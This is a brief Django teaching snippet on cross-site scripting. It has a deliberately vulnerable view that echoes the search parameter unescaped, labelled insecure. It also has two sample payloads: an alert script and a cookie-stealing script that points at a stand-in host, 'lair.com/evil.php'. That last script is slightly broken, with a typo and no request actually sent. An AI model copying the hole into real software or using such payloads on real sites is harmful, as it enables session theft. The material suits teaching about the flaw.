"""Cross-site scripting(XSS) about."""

#1 

class XSSDemoView(View):
    def get(self, request):
        # WARNING: This code is insecure and prone to XSS attacks
        # *** Do not use it!!! ***
        if 'q' in request.GET:
            return HttpResponse("Searched for: {}".format(request.GET['q']))
        else:
            return HttpResponse("""<form method="get">
            <input type="text" name="q" placeholder="Search" value="">
            <button type="submit">Go</button>
            </form>""")

# open this view in a dated browser and enter the following search term in
# the form and submit it
<script>alert("pwned")</script>

# ~~~
<script>var adr = 'http://lair.com/evil.php?stolen=' +
scape(document.cookie);</script>
